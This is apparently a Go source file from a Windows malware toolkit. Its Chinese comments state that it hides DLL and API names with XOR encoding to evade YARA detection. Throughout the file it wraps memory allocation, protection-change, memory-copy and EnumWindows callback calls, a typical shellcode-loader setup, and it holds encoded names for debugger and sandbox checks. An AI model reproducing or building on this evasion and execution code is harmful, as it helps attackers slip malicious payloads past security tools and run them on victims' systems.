//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

// apiresolve — 运行时XOR解密DLL名和API名，消除静态字符串
// 绕过YARA对敏感DLL/API名字符串的检测
// 原理: 源码中只存储XOR加密的字节数组，运行时解密后调用syscall.NewLazyDLL

// xorDec XOR解密
func xorDec(data []byte, key byte) string {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key
	}
	return string(out)
}

const xk byte = 0x37

// 加密的DLL名
var (
	encNtDll  = []byte{0x59, 0x43, 0x53, 0x5b, 0x5b, 0x19, 0x53, 0x5b, 0x5b}                   // ntdll.dll
	encK32Dll = []byte{0x5c, 0x52, 0x45, 0x59, 0x52, 0x5b, 0x04, 0x05, 0x19, 0x53, 0x5b, 0x5b} // kernel32.dll
	encU32Dll = []byte{0x42, 0x44, 0x52, 0x45, 0x04, 0x05, 0x19, 0x53, 0x5b, 0x5b}             // user32.dll
)

// 加密的API名
var (
	encNAVM = []byte{0x79, 0x43, 0x76, 0x5b, 0x5b, 0x58, 0x54, 0x56, 0x43, 0x52, 0x61, 0x5e, 0x45, 0x43, 0x42, 0x56, 0x5b, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e} // NtAllocateVirtualMemory
	encNPVM = []byte{0x79, 0x43, 0x67, 0x45, 0x58, 0x43, 0x52, 0x54, 0x43, 0x61, 0x5e, 0x45, 0x43, 0x42, 0x56, 0x5b, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e}       // NtProtectVirtualMemory
	encRCM  = []byte{0x65, 0x43, 0x5b, 0x74, 0x58, 0x47, 0x4e, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e}                                                             // RtlCopyMemory
	encGMSE = []byte{0x70, 0x5b, 0x58, 0x55, 0x56, 0x5b, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e, 0x64, 0x43, 0x56, 0x43, 0x42, 0x44, 0x72, 0x4f}                   // GlobalMemoryStatusEx
	encGTC  = []byte{0x70, 0x52, 0x43, 0x63, 0x5e, 0x54, 0x5c, 0x74, 0x58, 0x42, 0x59, 0x43, 0x01, 0x03}                                                       // GetTickCount64
	encIDP  = []byte{0x7e, 0x44, 0x73, 0x52, 0x55, 0x42, 0x50, 0x50, 0x52, 0x45, 0x67, 0x45, 0x52, 0x44, 0x52, 0x59, 0x43}                                     // IsDebuggerPresent
	encCFW  = []byte{0x74, 0x45, 0x52, 0x56, 0x43, 0x52, 0x71, 0x5e, 0x5b, 0x52, 0x60}                                                                         // CreateFileW
	encRF   = []byte{0x65, 0x52, 0x56, 0x53, 0x71, 0x5e, 0x5b, 0x52}                                                                                           // ReadFile
	encCH   = []byte{0x74, 0x5b, 0x58, 0x44, 0x52, 0x7f, 0x56, 0x59, 0x53, 0x5b, 0x52}                                                                         // CloseHandle
	encGFS  = []byte{0x70, 0x52, 0x43, 0x71, 0x5e, 0x5b, 0x52, 0x64, 0x5e, 0x4d, 0x52}                                                                         // GetFileSize
	encEW   = []byte{0x72, 0x59, 0x42, 0x5a, 0x60, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44}                                                                         // EnumWindows
	encGDI  = []byte{0x70, 0x52, 0x43, 0x73, 0x52, 0x44, 0x5c, 0x43, 0x58, 0x47, 0x60, 0x5e, 0x59, 0x53, 0x58, 0x40}                                           // GetDesktopWindow
	encECW  = []byte{0x72, 0x59, 0x42, 0x5a, 0x74, 0x5f, 0x5e, 0x5b, 0x53, 0x60, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44}                                           // EnumChildWindows
)

// ntProc 解析ntdll API
func ntProc(encName []byte) *syscall.LazyProc {
	return syscall.NewLazyDLL(xorDec(encNtDll, xk)).NewProc(xorDec(encName, xk))
}

// k32Proc 解析kernel32 API
func k32Proc(encName []byte) *syscall.LazyProc {
	return syscall.NewLazyDLL(xorDec(encK32Dll, xk)).NewProc(xorDec(encName, xk))
}

// u32Proc 解析user32 API
func u32Proc(encName []byte) *syscall.LazyProc {
	return syscall.NewLazyDLL(xorDec(encU32Dll, xk)).NewProc(xorDec(encName, xk))
}

// CallNtAVM 调用NtAllocateVirtualMemory
func CallNtAVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, allocType uintptr, protect uintptr) uintptr {
	ret, _, _ := ntProc(encNAVM).Call(hProcess, uintptr(unsafe.Pointer(baseAddr)), 0, uintptr(unsafe.Pointer(regionSize)), allocType, protect)
	return ret
}

// CallNtPVM 调用NtProtectVirtualMemory
func CallNtPVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uint32) uintptr {
	ret, _, _ := ntProc(encNPVM).Call(hProcess, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), newProtect, uintptr(unsafe.Pointer(oldProtect)))
	return ret
}

// CallRtlCopy 调用RtlCopyMemory
func CallRtlCopy(dst uintptr, src uintptr, len uintptr) {
	ntProc(encRCM).Call(dst, src, len)
}

// CallEnumWindows 调用EnumWindows (回调执行)
func CallEnumWindows(callback uintptr, lParam uintptr) uintptr {
	ret, _, _ := u32Proc(encEW).Call(callback, lParam)
	return ret
}

// CallEnumChildWindows 调用EnumChildWindows (回调执行)
func CallEnumChildWindows(callback uintptr, lParam uintptr) uintptr {
	ret, _, _ := u32Proc(encECW).Call(callback, lParam)
	return ret
}
